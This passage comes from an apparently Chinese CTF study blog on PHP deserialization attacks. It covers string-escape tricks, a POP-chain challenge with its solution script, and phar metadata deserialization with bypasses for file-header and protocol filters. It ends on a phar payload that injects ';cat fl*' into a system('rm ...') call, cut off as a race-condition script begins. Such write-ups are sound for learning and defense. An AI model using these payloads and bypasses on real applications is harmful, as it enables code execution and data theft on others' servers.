$c=unserialize($res);</span><br></pre></td></tr></table></figure><p>分析：</p><ul><li>经过filter之前：<code>O:1:&quot;A&quot;:2:&#123;s:4:&quot;name&quot;;s:81:&quot;bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb&quot;;s:4:&quot;pass&quot;;s:6:&quot;hacker&quot;;&#125;&quot;;s:4:&quot;pass&quot;;s:6:&quot;123456&quot;;&#125;</code> 27*2和b加27个其他的‘“;s:4:”pass”;s:6:”hacker”;}’</li><li>这个还是正常的，然后我们把bb换成ccc，然后81对应的字符串就是27*3&#x3D;81个c，<code> `O:1:&quot;A&quot;:2:&#123;s:4:&quot;name&quot;;s:81:&quot;ccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccc&quot;`;s:4:&quot;pass&quot;;s:6:&quot;hacker&quot;;&#125;&quot;`;s:4:&quot;pass&quot;;s:6:&quot;123456&quot;;&#125;</code></li><li>成功逃逸出来，剩下的关于pass的被闭合丢掉了</li></ul><h6 id="过滤后字符变少"><a href="#过滤后字符变少" class="headerlink" title="过滤后字符变少"></a>过滤后字符变少</h6><p>demo:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"> &lt;?php</span><br><span class="line"> function str_rep($string)&#123;</span><br><span class="line">     return preg_replace( &#x27;/phptest/&#x27;,&#x27;&#x27;, $string);</span><br><span class="line"> &#125;</span><br><span class="line"> ​</span><br><span class="line"> $test[&#x27;name&#x27;] = $_GET[&#x27;name&#x27;];</span><br><span class="line"> $test[&#x27;sign&#x27;] = $_GET[&#x27;sign&#x27;]; </span><br><span class="line"> $test[&#x27;number&#x27;] = &#x27;2020&#x27;;</span><br><span class="line"> $temp = str_rep(serialize($test));</span><br><span class="line"> printf($temp);</span><br><span class="line"> $fake = unserialize($temp);</span><br><span class="line"> echo &#x27;&lt;br&gt;&#x27;;</span><br><span class="line"> print(&quot;name:&quot;.$fake[&#x27;name&#x27;].&#x27;&lt;br&gt;&#x27;);</span><br><span class="line"> print(&quot;sign:&quot;.$fake[&#x27;sign&#x27;].&#x27;&lt;br&gt;&#x27;);</span><br><span class="line"> print(&quot;number:&quot;.$fake[&#x27;number&#x27;].&#x27;&lt;br&gt;&#x27;);</span><br><span class="line"> ?&gt;</span><br></pre></td></tr></table></figure><p>分析：</p><ul><li>把&#x2F;phptest&#x2F;换成空，造成字符变少。</li><li>我们通过构造name和sign来改变number，后者sign的值。</li><li> $name&#x3D;’testtesttesttesttesttest’<br> $sign&#x3D;’hello”;s:4:”sign”;s:4:”eval”;s:6:”number”;s:4:”eval”;}’<br> $number&#x3D;2023<br> &#x2F;&#x2F;最终：<br> name:’”;s:4:”sign”;s:54:”hello’<br> sign:’eval’<br> number:’eval’</li><li>这个时候name前面的字符数量本来是24，但是name此时为空，也就是把sign后面的前面几位也包进去了</li><li>构造闭合之后<code>&quot;;</code>作为结尾，再构造后面的值，去改变sign或者number都可以</li><li>关键就是这个字符减少，第一个设定字符数就大于实际字符数，就会把第二个字符也包进去，就把第二个的字符数包进去了，那个第二个甚至后面的字符数，字符内容都可以自己构造了!</li></ul><hr><h4 id="pop链的利用"><a href="#pop链的利用" class="headerlink" title="pop链的利用"></a>pop链的利用</h4><hr><p>直接看例题：</p><h5 id="题目一"><a href="#题目一" class="headerlink" title="题目一"></a>题目一</h5><h6 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"> error_reporting(0);</span><br><span class="line"> show_source(&quot;index.php&quot;);</span><br><span class="line"> ​</span><br><span class="line"> class w44m        c</span><br><span class="line"> &#123;</span><br><span class="line"> ​</span><br><span class="line">     private $admin = &#x27;aaa&#x27;;</span><br><span class="line">     protected $passwd = &#x27;123456&#x27;;</span><br><span class="line"> ​</span><br><span class="line">     public function Getflag()</span><br><span class="line">     &#123;</span><br><span class="line">         if ($this-&gt;admin === &#x27;w44m&#x27; &amp;&amp; $this-&gt;passwd === &#x27;08067&#x27;) &#123;</span><br><span class="line">             include(&#x27;flag.php&#x27;);</span><br><span class="line">             echo $flag;</span><br><span class="line">         &#125; else &#123;</span><br><span class="line">             echo $this-&gt;admin;</span><br><span class="line">             echo $this-&gt;passwd;</span><br><span class="line">             echo &#x27;nono&#x27;;</span><br><span class="line">         &#125;</span><br><span class="line">     &#125;</span><br><span class="line"> &#125;</span><br><span class="line"> ​</span><br><span class="line"> class w22m             a</span><br><span class="line"> &#123;</span><br><span class="line">     public $w00m;</span><br><span class="line"> ​</span><br><span class="line">     public function __destruct()</span><br><span class="line">     &#123;</span><br><span class="line">         echo $this-&gt;w00m;</span><br><span class="line">     &#125;</span><br><span class="line"> &#125;</span><br><span class="line"> ​</span><br><span class="line"> class w33m                      b</span><br><span class="line"> &#123;</span><br><span class="line">     public $w00m;</span><br><span class="line">     public $w22m;</span><br><span class="line"> ​</span><br><span class="line">     public function __toString()</span><br><span class="line">     &#123;</span><br><span class="line">         $this-&gt;w00m-&gt;&#123;$this-&gt;w22m&#125;();</span><br><span class="line">         return 0;</span><br><span class="line">     &#125;</span><br><span class="line"> &#125;</span><br><span class="line"> $w00m = $_GET[&#x27;w00m&#x27;];</span><br><span class="line"> unserialize($w00m);</span><br></pre></td></tr></table></figure><h6 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h6><p>1.首先看到w44m这个class，自然写出脚本</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"> class w44m</span><br><span class="line"> &#123;</span><br><span class="line">     private $admin = &#x27;w44m&#x27;;</span><br><span class="line">     protected $passwd = &#x27;08067&#x27;;</span><br><span class="line"> &#125;</span><br><span class="line"> $a=new ;</span><br><span class="line"> ​</span><br><span class="line"> echo urlencode(serialize($a));</span><br></pre></td></tr></table></figure><p>2.现在目的是调用 function Getflag()，这个函数。然后payload应该是 &#x2F;?w00m&#x3D;(最后两排)</p><p>3.最后一步是反序列化一个w00m，那么考虑从destruct入手（销毁时调用）。</p><p>4.调用distruct，就是一个echo，这个时候想到另一个魔术方法__toString（将对象作为字符串操作时调用），所以要让$this-&gt;w00m存的是字符串。</p><p>5.调用后，此时 $this-&gt;w00m-&gt;{$this-&gt;w22m}(); 注意这里有一个（），像是一个函数，也就是说如果w22m&#x3D;Getflag那么就变成 $this-&gt;w00m-&gt;Getflag（）。。。也就是调用这个函数，达到目的。所以让w00m表示class w44m这个类</p><p>6.先写出这几个对象</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"> class w44m</span><br><span class="line"> &#123;</span><br><span class="line">     private $admin = &#x27;w44m&#x27;;</span><br><span class="line">     protected $passwd = &#x27;08067&#x27;;</span><br><span class="line"> &#125;</span><br><span class="line"> class w22m</span><br><span class="line"> &#123;</span><br><span class="line">     public $w00m;</span><br><span class="line"> &#125;</span><br><span class="line"> class w33m</span><br><span class="line"> &#123;</span><br><span class="line">     public $w00m;</span><br><span class="line">     public $w22m;</span><br><span class="line"> &#125;</span><br><span class="line">     $a = new w22m；</span><br><span class="line">     $b= new w33m；</span><br><span class="line">     $c = new w44m；</span><br><span class="line">     </span><br></pre></td></tr></table></figure><h6 id="总体思路："><a href="#总体思路：" class="headerlink" title="总体思路："></a>总体思路：</h6><blockquote><p>#具体链子是： w22m-&gt;w00m&#x3D;new w33m ——–》 tostring ——–》 w33m-&gt;woom&#x3D;w44m + w33m-&gt;w22m&#x3D;Getflag ——–》 Getflag()</p></blockquote><p>1.$a-&gt;w00m&#x3D;$b;</p><p>触发destruct后调用w33m.__toString();</p><p>2.$b-&gt;w22m&#x3D;’Getflag’;</p><p>$b-&gt;w00m&#x3D;$c;</p><p>让$this-&gt;w00m-&gt;{$this-&gt;w22m}(); 变成执行$c中Getflag()函数</p><h6 id="答案（抄）"><a href="#答案（抄）" class="headerlink" title="答案（抄）"></a>答案（抄）</h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"> &lt;?php class w44m&#123; private $admin = &#x27;w44m&#x27;; protected $passwd = &#x27;08067&#x27;; &#125;</span><br><span class="line"> class w22m&#123; public $w00m; &#125;</span><br><span class="line"> class w33m&#123; public $w00m; public $w22m; &#125;</span><br><span class="line"> # w22m.__destruct().w00m-&gt;w33m.__toString().w00m-&gt;w44m.Getflag()</span><br><span class="line"> $a = new w22m();</span><br><span class="line"> $b = new w33m();</span><br><span class="line"> $c = new w44m(); # 入口</span><br><span class="line"> $a-&gt;w00m=$b; # 链子</span><br><span class="line"> $b-&gt;w00m=$c;</span><br><span class="line"> $b-&gt;w22m=&#x27;Getflag&#x27;; </span><br><span class="line"> echo urlencode(serialize($a)); ?&gt; </span><br></pre></td></tr></table></figure><hr><h4 id="phar反序列化"><a href="#phar反序列化" class="headerlink" title="phar反序列化"></a>phar反序列化</h4><h5 id="基础"><a href="#基础" class="headerlink" title="基础"></a>基础</h5><p>Phar全称 PHP Archive</p><p>Phar可以认为是PHP的压缩文档，是PHP中类似于JAR的一种打包文件。他可以把多个文件存放至同一个文件中，无需解压，PHP就可以进行访问并执行其内部语句。.phar文件提供了一种将完整的PHP程序分布在一个文件中并从该文件中运行的方法。</p><p>一些配置：</p><blockquote><p>默认phar扩展是只读模式，需要手动配置php.ini中<code>phar.readonly= Off</code></p><p>默认开启版本 PHP version &gt;&#x3D; 5.3</p></blockquote><p><strong>demo</strong>:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"> &lt;?php</span><br><span class="line">     $phar = new Phar(&#x27;demo.phar&#x27;);</span><br><span class="line">     $phar[&#x27;demo.php&#x27;] = &#x27;&lt;?php echo 1;?&gt;&#x27;;</span><br><span class="line">     include(&#x27;phar://./demo.phar/demo.php&#x27;); //1</span><br><span class="line"> ?&gt;</span><br></pre></td></tr></table></figure><p>使用phar:&#x2F;&#x2F;伪协议读取phar文件。</p><h6 id="Phar文件格式"><a href="#Phar文件格式" class="headerlink" title="Phar文件格式"></a>Phar文件格式</h6><ul><li>a stub</li><li>a manifest describing the contents</li><li>the file contents</li><li>[optional] a signature for verify Phar integrity(phar file format only)</li></ul><p><strong>stub</strong>：stub是phar文件的文件头，格式为：<code>...&lt;?php... __HALT_COMPILER();?&gt;</code>其中<code>...</code>可以是任意字符，也可以留空，留空的话就是：<code>&lt;?php __HALT_COMPILER();?&gt;</code>。注意php闭合号与最后一个分号之间不能有多于一个的空格符。另外PHP闭合符也是可以省略的。</p><p>最短省略闭合符的stub是<code>__HALT_COMPILER();?&gt;</code></p><p><strong>manifest describing the contents</strong>：该区域存放phar包的属性信息，允许每个文件指定文件压缩、文件权限，甚至是用户定义的元数据，如文件用户或组。</p><p><strong>file contents</strong> ：被压缩的用户添加的文件内容</p><p><strong>[可选]signature</strong>：可选，phar文件的签名，允许的有MD5, SHA1, SHA256, SHA512和OPENSSL</p><h6 id="生成Phar文件"><a href="#生成Phar文件" class="headerlink" title="生成Phar文件"></a>生成Phar文件</h6><ul><li><p>实例化Phar类：通常只需要传入文件名 <?php    $phar = new Phar('demo.phar');   ?>具体参数解读：<code>new Phar($buildRoot . &quot;/myphar.phar&quot;, FilesystemIterator::CURRENT_AS_FILEINFO FilesystemIterator::KEY_AS_FILENAME, &quot;myphar.phar&quot;);。</code>一个新的Phar对象的创建通常需要三个参数。</p><ul><li>第一个参数是Phar文件路径[不仅可以通过它创建Phar文件还可以对现存的Phar文件进行操作]</li><li>第二个参数是设定Phar文件对象如何处理文件。可以不填写此时提供的值是<code>RecursiveDirectoryIterator</code> 的缺省值。</li><li>第三个参数是Phar文件的别名，在内部引用这个Phar文件时都需要使用这个别名</li></ul><p><strong>通常我们只需要传入第三个参数。</strong></p></li><li><p>创建stub有两种方法创建stub：自定义创建和使用默认stub。</p><ul><li>自定义创建，也就是调用类方法<code>Phar::setStub($string)</code>为实例创建自定义stub <?php    $phar = new Phar('demo.phar');    $phar->setStub('<?php echo \\'in stub!\\';\_\_HALT\_COMPILER();?>‘);<br>  include(‘phar:&#x2F;&#x2F;demo.phar’); &#x2F;&#x2F; in stub!<br> ?&gt;</li><li>使用默认stub，也就是调用类方法<code>Phar::setDefaultStub()</code>为实例设置默认stub，使用方法<code>Phar::getStub()</code>获取实例的stub <?php       $phar = new Phar('demo.phar');       $phar->setDefaultStub();       print\_r($phar->getStub()); // 2, 'c' => 'text/plain', 'cc' => 'text/plain', ...   ?></li></ul></li><li><p>【可选】添加自定义元数据调用类方法<code>Phar::setMetadata()</code>为实例设置默认stub，使用方法Phar::getMetadata()获取实例的stub <?php       $phar = new Phar('demo.phar');       $metadata = array('demo'=>1);       $phar->setMetadata($metadata);       print\_r($phar->getMetadata()); // Array ( \[demo\] => 1 )   ?></p></li><li><p>【可选】添加文件添加文件有几种方法：手动添加已有文件，以字符串添加文件内容，添加空目录，手动选择添加已有目录，从迭代器添加。重点看前两个</p><ul><li>手动添加已有文件 <?php    $phar = new Phar('demo.phar');    $phar->addFile('test.php');    include('phar://demo.phar/test.php') // in test.php   ?></li><li>以字符串形式添加文件内容 <?php    $phar = new Phar('demo.phar');    $phar->addFromString('test.php','<?php echo \\'in test.php\\'?>‘);<br>  include(‘phar:&#x2F;&#x2F;demo.phar&#x2F;test.php’); &#x2F;&#x2F; in test.php<br> ?&gt;</li></ul></li><li><p>【可选】手动添加支持的签名缺省会自动签名，基于SHA-1算法 <?php    $phar = new Phar('demo.phar');    $phar->addFromString('test.php',1);   print\_r($phar->getSignature()); // Array ( \[hash\] => F... \[hash\_type\] => SHA-1 )   ?></p></li><li><p>【可选】提高性能在实例化phar类后，调用方法<code>Phar::startBuffering()</code>和<code>Phar::stopBuffering</code>创建缓冲区，并在缓冲区进行创建、添加等操作 <?php    $phar = new Phar('phar.phar');    $phar->startBuffering();    $phar->setStub('<? \_\_HALT\_\_COMPILER();?>‘);<br>  $phar-&gt;addFromString(‘test.php’,’<?php echo \\'in test.php\\'?>‘);<br>  $phar-&gt;stopBuffering();<br> ?&gt;上面这个demo就是创建一个Phar文件的基本步骤。</p></li></ul><h6 id="php文件上传-文件包含-phar伪协议"><a href="#php文件上传-文件包含-phar伪协议" class="headerlink" title="php文件上传+文件包含(phar伪协议)"></a>php文件上传+文件包含(phar伪协议)</h6><p>原理：通过伪协议上传马，然后连接webshell</p><p>phar伪协议特性：<code>不管后缀是什么，都当作压缩包来解</code></p><p>phar协议和zip协议差不过，都是可以访问zip格式的压缩包的内容</p><p>所以我们写一个PHP一句话马，压缩成zip，接着手动改后缀为png，上传到服务器中。最后用phar伪协议文件包含，发现被成功解析。</p><hr><h5 id="在反序列化中的利用"><a href="#在反序列化中的利用" class="headerlink" title="在反序列化中的利用"></a>在反序列化中的利用</h5><p><code>我们一般利用反序列漏洞，一般都是借助unserialize()函数，不过随着人们安全的意识的提高这种漏洞利用越来越来难了，但是在今年8月份的Blackhat2018大会上，来自Secarma的安全研究员Sam Thomas讲述了一种攻击PHP应用的新方式，利用这种方法可以在不使用unserialize()函数的情况下触发PHP反序列化漏洞。漏洞触发是利用Phar:// 伪协议读取phar文件时，会反序列化meta-data储存的信息。</code></p><p>即，在题目背景中没有反序列化函数而有文件上传的入口时，可以考虑通过Phar伪协议来进行自自动的反序列化。</p><h6 id="前提函数"><a href="#前提函数" class="headerlink" title="前提函数"></a>前提函数</h6><p><code>php一大部分的文件系统函数在通过</code>phar:&#x2F;&#x2F;<code>伪协议解析phar文件时，都会将meta-data进行反序列化，测试后受影响的函数如下</code></p><p><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/ad500678d3ce94923a94ed61e1ef9154-1024x322.png"></p><h6 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h6><p>demo：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"> &lt;?php</span><br><span class="line">     class TestObject &#123;</span><br><span class="line">     &#125;</span><br><span class="line">     $phar = new Phar(&quot;phar.phar&quot;); //后缀名必须为phar</span><br><span class="line">     $phar-&gt;startBuffering();</span><br><span class="line">     $phar-&gt;setStub(&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;); //设置stub</span><br><span class="line">     $o = new TestObject();</span><br><span class="line">     $o -&gt; data=&#x27;hu3sky&#x27;;</span><br><span class="line">     $phar-&gt;setMetadata($o); //将自定义的meta-data存入manifest</span><br><span class="line">     $phar-&gt;addFromString(&quot;test.txt&quot;, &quot;test&quot;); //添加要压缩的文件</span><br><span class="line">     //签名自动计算</span><br><span class="line">     $phar-&gt;stopBuffering();</span><br><span class="line"> ?&gt;</span><br></pre></td></tr></table></figure><p>利用条件：</p><ul><li>phar文件要能够上传到服务器端</li></ul><hr><h5 id="一些绕过"><a href="#一些绕过" class="headerlink" title="一些绕过"></a>一些绕过</h5><h6 id="文件头检测"><a href="#文件头检测" class="headerlink" title="文件头检测"></a>文件头检测</h6><p>当然如果题目还会在后端检查文件类型的话，就需要将phar文件后缀改成图片或者其他格式。</p><p>再真实一点，可以加一个文件头:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"> &lt;?php</span><br><span class="line">     class TestObject &#123;</span><br><span class="line">     &#125;</span><br><span class="line">     @unlink(&quot;phar.phar&quot;);</span><br><span class="line">     $phar = new Phar(&quot;phar.phar&quot;);</span><br><span class="line">     $phar-&gt;startBuffering();</span><br><span class="line">     $phar-&gt;setStub(&quot;GIF89a&quot;.&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;); //设置stub，增加gif文件头</span><br><span class="line">     $o = new TestObject();</span><br><span class="line">     $phar-&gt;setMetadata($o); //将自定义meta-data存入manifest</span><br><span class="line">     $phar-&gt;addFromString(&quot;test.txt&quot;, &quot;test&quot;); //添加要压缩的文件</span><br><span class="line">     //签名自动计算</span><br><span class="line">     $phar-&gt;stopBuffering();</span><br><span class="line"> ?&gt;</span><br></pre></td></tr></table></figure><h6 id="phar文件开头"><a href="#phar文件开头" class="headerlink" title="phar文件开头"></a>phar文件开头</h6><p>如果后端还不能让phar作为开头的话，还能够两个伪协议嵌套：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"> if (preg_match(&quot;/^php^file^gopher^http^https^ftp^data^phar^smtp^dict^zip/i&quot;,$filename)&#123;</span><br><span class="line">     die();</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><p>绕过：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"> // Bzip / Gzip 当环境限制了phar不能出现在前面的字符里。可以使用compress.bzip2://和compress.zlib://绕过</span><br><span class="line"> ​</span><br><span class="line"> compress.bzip://phar:///test.phar/test.txt</span><br><span class="line"> compress.bzip2://phar:///home/sx/test.phar/test.txt</span><br><span class="line"> compress.zlib://phar:///home/sx/test.phar/test.txt</span><br><span class="line"> php://filter/resource=phar:///test.phar/test.txt</span><br><span class="line"> // 还可以使用伪协议的方法绕过</span><br><span class="line"> php://filter/read=convert.base64-encode/resource=phar://phar.phar</span><br></pre></td></tr></table></figure><p>绕过<code>__HALT_COMOILER</code>的检测</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"> if (preg_match(&quot;/&lt;/?phpHALT_COMPILER/i&quot;,$filename)&#123;</span><br><span class="line">     die();</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><p>因为phar文件要求必须是以这个结尾，不能绕过，只能想其他方法</p><p>方法一：将phar文件使用gzip命令压缩压缩文件里面就没有<code>__HALT_COMOILER</code>了，变成<code>phar.phar.gz</code>，上传成功之后利用文件包含漏洞解析该压缩包。</p><p>方法二：将phar的内容写进压缩包注释中，也同样能够反序列化成功，压缩为zip也会绕过该正则</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"> $phar_file = serialize($exp);</span><br><span class="line">     echo $phar_file;</span><br><span class="line">     $zip = new ZipArchive();</span><br><span class="line">     $res = $zip-&gt;open(&#x27;1.zip&#x27;,ZipArchive::CREATE); </span><br><span class="line">     $zip-&gt;addFromString(&#x27;crispr.txt&#x27;, &#x27;...&#x27;);</span><br><span class="line">     $zip-&gt;setArchiveComment($phar_file);</span><br><span class="line">     $zip-&gt;close();</span><br></pre></td></tr></table></figure><hr><h5 id="题目一-1"><a href="#题目一-1" class="headerlink" title="题目一"></a>题目一</h5><h6 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"> class filter&#123;</span><br><span class="line">     public $filename;</span><br><span class="line">     public $filecontent;</span><br><span class="line">     public $evilfile=false;</span><br><span class="line">     public $admin = false;</span><br><span class="line"> ​</span><br><span class="line">     public function __construct($f,$fn)&#123;</span><br><span class="line">         $this-&gt;filename=$f;</span><br><span class="line">         $this-&gt;filecontent=$fn;</span><br><span class="line">     &#125;</span><br><span class="line">     public function checkevil()&#123;</span><br><span class="line">         if(preg_match(&#x27;/php\.\./i&#x27;, $this-&gt;filename))&#123;</span><br><span class="line">             $this-&gt;evilfile=true;</span><br><span class="line">         &#125;</span><br><span class="line">         if(preg_match(&#x27;/flag/i&#x27;, $this-&gt;filecontent))&#123;</span><br><span class="line">             $this-&gt;evilfile=true;</span><br><span class="line">         &#125;</span><br><span class="line">         return $this-&gt;evilfile;</span><br><span class="line">     &#125;</span><br><span class="line">     public function __destruct()&#123;</span><br><span class="line">         if($this-&gt;evilfile &amp;&amp; $this-&gt;admin)&#123;</span><br><span class="line">             system(&#x27;rm &#x27;.$this-&gt;filename);</span><br><span class="line">         &#125;</span><br><span class="line">     &#125;</span><br><span class="line"> &#125;</span><br><span class="line"> ​</span><br><span class="line"> if(isset($_GET[&#x27;fn&#x27;]))&#123;</span><br><span class="line">     $content = file_get_contents(&#x27;php://input&#x27;);</span><br><span class="line">     $f = new filter($_GET[&#x27;fn&#x27;],$content);</span><br><span class="line">     if($f-&gt;checkevil()===false)&#123;</span><br><span class="line">         file_put_contents($_GET[&#x27;fn&#x27;], $content);</span><br><span class="line">         copy($_GET[&#x27;fn&#x27;],md5(mt_rand()).&#x27;.txt&#x27;);</span><br><span class="line">         unlink($_SERVER[&#x27;DOCUMENT_ROOT&#x27;].&#x27;/&#x27;.$_GET[&#x27;fn&#x27;]);</span><br><span class="line">         echo &#x27;work done&#x27;;</span><br><span class="line">     &#125;</span><br><span class="line">     </span><br><span class="line"> &#125;else&#123;</span><br><span class="line">     echo &#x27;where is flag?&#x27;;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><h6 id="分析-1"><a href="#分析-1" class="headerlink" title="分析"></a>分析</h6><ul><li>入口点是<code>file_put_content</code>函数，去写入phar文件。</li><li>该函数第一个参数可控，所以我们使用phar伪协议</li><li>再通过第二个参数<code>content</code>传入phar文件数据</li><li>这样通过phar伪协议解析的时候就会对metadata的部分反序列化</li><li>不过题目会删除文件（在析构对象的时候），所以需要条件竞争。</li></ul><h6 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h6><p>构造phar文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"> &lt;?php</span><br><span class="line"> class filter </span><br><span class="line"> &#123;</span><br><span class="line">     public $filename = &#x27;;cat fl*&#x27;;</span><br><span class="line">     public $evilfile = true;</span><br><span class="line">     public $admin = true;</span><br><span class="line"> &#125;</span><br><span class="line"> // 后缀必须为phar</span><br><span class="line"> $phar = new Phar(&quot;evil.phar&quot;);</span><br><span class="line"> $phar-&gt;startBuffering();</span><br><span class="line"> // 设置 stubb</span><br><span class="line"> $phar-&gt;setStub(&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;);</span><br><span class="line"> $o = new filter();</span><br><span class="line"> /**</span><br><span class="line">  * 将自定义的 meta-data 存入 manifest</span><br><span class="line">  */</span><br><span class="line"> $phar-&gt;setMetadata($o);</span><br><span class="line"> // 添加需压缩的文件</span><br><span class="line"> $phar-&gt;addFromString(&quot;test.txt&quot;, &quot;test&quot;);</span><br><span class="line"> $phar-&gt;stopBuffering();</span><br><span class="line"> ?&gt;</span><br></pre></td></tr></table></figure><p>python 脚本：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"> import base64</span><br><span class="line"> import requests</span><br><span class="line"> import threading</span><br><span class="line"> ​</span><br><span class="line"> flag = False</span><br><span class="line"> url 